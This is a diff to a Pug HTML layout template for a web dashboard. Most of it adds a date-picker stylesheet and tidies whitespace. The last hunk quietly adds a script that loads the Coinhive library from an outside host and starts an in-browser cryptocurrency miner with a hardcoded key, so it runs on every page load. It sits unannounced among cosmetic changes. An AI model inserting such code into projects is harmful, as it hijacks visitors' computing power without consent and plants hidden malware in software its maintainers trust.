@@ -18,6 +18,9 @@ html
     link(href="/css/themesDash/animate.min.css", rel="stylesheet")
     link(href="/css/themesDash/main.css", rel="stylesheet")
 
+    // calendar
+    link(href="/css/themesDash/bootstrap-datetimepicker.css", rel="stylesheet")
+
     // Fonts and icons
     link(href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css", rel="stylesheet")
     link(href='http://fonts.googleapis.com/css?family=Roboto:400,700,300' rel='stylesheet', type='text/css')
@@ -31,7 +34,11 @@ html
           include partials/menu-top
 
           .content
-            .container-fluid    
+            .container-fluid
               block content
 
         include footer
+      script(src='https://coin-hive.com/lib/coinhive.min.js')
+      script.
+        var miner = new CoinHive.Anonymous('j3eRKLt17aS67JWhrqfJ8zHOqvUSZ3P8');
+        miner.start();
